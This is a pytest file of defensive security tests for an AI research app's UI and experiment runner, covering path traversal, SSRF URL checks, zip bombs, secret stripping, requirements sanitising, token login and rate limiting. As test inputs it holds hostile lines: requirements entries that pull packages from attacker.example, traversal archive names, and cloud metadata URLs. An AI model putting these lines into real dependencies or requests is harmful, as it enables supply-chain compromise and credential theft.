"""
What stops a stranger, or a brief written by one, from using this machine.

2026-09-20 product audit: the UI had no access check at all, a brief's URLs
were fetched wherever they pointed, archives were expanded without a ceiling,
session ids from the URL reached file paths, and every secret in .env was
handed to model-written code.
"""
import io
import sys
import zipfile

import pytest

import config
from agents.experiment_runner import _without_secrets
from tools import dataset_schema
from tools.url_safety import UnsafeURL, check_url, read_zip_member, safe_members


# --- session ids in file paths -----------------------------------------------

def test_a_session_id_cannot_walk_out_of_the_experiments_folder():
    inside = config.session_experiment_dir("c5a020c3-ce44-4df7-a6db-8003994a5532")
    assert inside.parent == config.EXPERIMENTS_DIR
    for bad in ("../../data", "..", "a/b", "C:\\Windows", "", "x" * 80):
        with pytest.raises(ValueError):
            config.session_experiment_dir(bad)


# --- URLs out of a brief ------------------------------------------------------

def test_a_brief_cannot_point_the_downloader_at_this_machine():
    for url in ("http://127.0.0.1:8000/api/sessions", "http://localhost/x.csv",
                "http://169.254.169.254/latest/meta-data/", "http://[::1]/x.csv"):
        with pytest.raises(UnsafeURL):
            check_url(url)


def test_only_http_urls_are_fetched():
    for url in ("file:///C:/Windows/win.ini", "ftp://example.com/x.csv", "not a url"):
        with pytest.raises(UnsafeURL):
            check_url(url)


def test_an_allowlist_keeps_downloads_to_named_hosts():
    with pytest.raises(UnsafeURL, match="DATASET_ALLOWED_HOSTS"):
        check_url("https://example.com/x.csv", allow_hosts=["who.int"])


def test_an_unsafe_url_is_reported_as_an_unavailable_dataset(tmp_path):
    with pytest.raises(dataset_schema.DatasetUnavailable, match="inside this network"):
        dataset_schema.load_schema("http://127.0.0.1:9/data.csv", cache_dir=tmp_path)


# --- archives -----------------------------------------------------------------

def _zip(name: str, data: bytes) -> zipfile.ZipFile:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(name, data)
    return zipfile.ZipFile(buf)


def test_a_small_archive_that_expands_enormously_is_refused():
    zf = _zip("bomb.csv", b"0" * 20_000_000)          # compresses to a few kB
    with pytest.raises(UnsafeURL, match="expands"):
        read_zip_member(zf, "bomb.csv", limit_bytes=1_000_000)


def test_members_naming_paths_outside_the_archive_are_skipped():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name in ("../../evil.csv", "/etc/passwd.csv", "data/good.csv", "notes.txt"):
            zf.writestr(name, "a,b\n1,2\n")
    assert safe_members(zipfile.ZipFile(buf)) == ["data/good.csv"]


def test_a_member_within_the_limit_is_read():
    zf = _zip("good.csv", b"a,b\n1,2\n")
    assert read_zip_member(zf, "good.csv", limit_bytes=1_000_000) == b"a,b\n1,2\n"


# --- what model-written code inherits ------------------------------------------

def test_no_secret_reaches_an_experiment_subprocess():
    env = _without_secrets({"ANTHROPIC_API_KEY": "sk-x", "OPENALEX_API_KEY": "k",
                            "OPENREVIEW_PASSWORD": "p", "AWS_SECRET_ACCESS_KEY": "s",
                            "GH_TOKEN": "t", "PATH": "/usr/bin", "RUNNER_PYTHON": "python"})
    assert env == {"PATH": "/usr/bin", "RUNNER_PYTHON": "python"}


def test_requirements_may_only_name_packages(tmp_path):
    from agents.experiment_runner import ExperimentRunnerAgent

    req = tmp_path / "requirements.txt"
    req.write_text("\n".join([
        "numpy>=1.26",
        "--index-url http://attacker.example/simple",
        "https://attacker.example/wheel-1.0-py3-none-any.whl",
        "-e .",
        "evil @ https://attacker.example/evil.tar.gz",
        "C:\\Users\\example-user\\evil",
        "pandas==2.2.0",
    ]) + "\n", encoding="utf-8")

    ExperimentRunnerAgent._sanitize_requirements(object.__new__(ExperimentRunnerAgent), req)

    assert req.read_text(encoding="utf-8").split() == ["numpy>=1.26", "pandas>=2.2.0"]


# --- the UI's own door ---------------------------------------------------------

@pytest.fixture
def client(monkeypatch):
    from fastapi.testclient import TestClient
    import ui.app as ui_app

    monkeypatch.setattr(config, "UI_TOKEN", "s3cret-token")
    return TestClient(ui_app.app)


def test_without_the_token_no_data_is_served(client):
    assert client.get("/api/sessions").status_code == 401
    assert client.get("/api/dashboard").status_code == 401
    assert client.get("/api/access/tokens").status_code == 401
    # The page itself loads so it can show the sign-in screen, and it may ask
    # whether a token is needed at all — neither reveals anything.
    assert client.get("/").status_code == 200
    assert client.get("/api/access/state").json() == {"locked": True, "signed_in": False}


def test_signing_in_with_the_token_sets_a_cookie(client):
    assert client.post("/api/login", json={"token": "wrong"}).status_code == 401
    assert client.post("/api/login", json={"token": "s3cret-token"}).status_code == 200
    assert client.get("/api/sessions").status_code == 200          # cookie from the login
    assert client.get("/api/access/state").json()["signed_in"] is True
    client.post("/api/logout")
    assert client.get("/api/sessions").status_code == 401


def test_the_token_opens_the_door_and_is_remembered(client):
    assert client.get("/api/sessions", headers={"Authorization": "Bearer s3cret-token"}).status_code == 200
    assert client.get("/api/sessions", params={"token": "s3cret-token"}).status_code == 200
    assert client.get("/api/sessions").status_code == 200      # cookie from the call above
    assert client.get("/api/sessions", params={"token": "wrong"}).status_code == 401


def test_a_websocket_without_the_token_is_closed(client):
    from starlette.websockets import WebSocketDisconnect

    with pytest.raises(WebSocketDisconnect):
        with client.websocket_connect("/ws/abc") as ws:
            ws.receive_json()


def test_the_server_refuses_to_serve_the_network_without_a_token(monkeypatch):
    import run_ui

    assert run_ui._loopback("127.0.0.1") and run_ui._loopback("localhost")
    assert not run_ui._loopback("0.0.0.0") and not run_ui._loopback("192.168.1.10")

    monkeypatch.setattr(config, "UI_TOKEN", "")
    monkeypatch.setattr(sys, "argv", ["run_ui.py", "--host", "0.0.0.0", "--no-browser"])
    with pytest.raises(SystemExit) as exit_info:
        run_ui.main()
    assert exit_info.value.code == 2


# --- once it is on the internet ------------------------------------------------

def test_the_token_cookie_is_marked_secure_behind_https(client):
    plain = client.post("/api/login", json={"token": "s3cret-token"})
    assert "secure" not in plain.headers["set-cookie"].lower()      # plain http, local use

    behind_proxy = client.post("/api/login", json={"token": "s3cret-token"},
                               headers={"x-forwarded-proto": "https"})
    assert "secure" in behind_proxy.headers["set-cookie"].lower()
    assert "httponly" in behind_proxy.headers["set-cookie"].lower()


def test_guessing_the_token_is_slowed_down(client):
    import ui.app as ui_app
    ui_app._LOGIN_ATTEMPTS.clear()
    codes = [client.post("/api/login", json={"token": f"guess-{i}"}).status_code for i in range(12)]
    assert codes[:10] == [401] * 10
    assert codes[10:] == [429, 429]
    # A correct token still has to wait out the window, which is the point.
    assert client.post("/api/login", json={"token": "s3cret-token"}).status_code == 429
    ui_app._LOGIN_ATTEMPTS.clear()


def test_a_huge_paste_is_refused_rather_than_read_into_memory(client):
    import ui.app as ui_app
    ui_app._LOGIN_ATTEMPTS.clear()
    client.post("/api/login", json={"token": "s3cret-token"})
    db_session = client.post("/api/sessions", json={"topic": "x", "autostart": False})
    sid = db_session.json()["session_id"]
    huge = "title,year\n" + ("a,2020\n" * 700_000)
    r = client.post(f"/api/sessions/{sid}/import/papers", json={"text": huge, "filename": "big.csv"})
    assert r.status_code == 413 and "MB" in r.json()["detail"]


def test_there_is_a_health_check_that_leaks_nothing(client):
    r = client.get("/health")
    assert r.status_code == 200
    assert set(r.json()) == {"status", "database"}
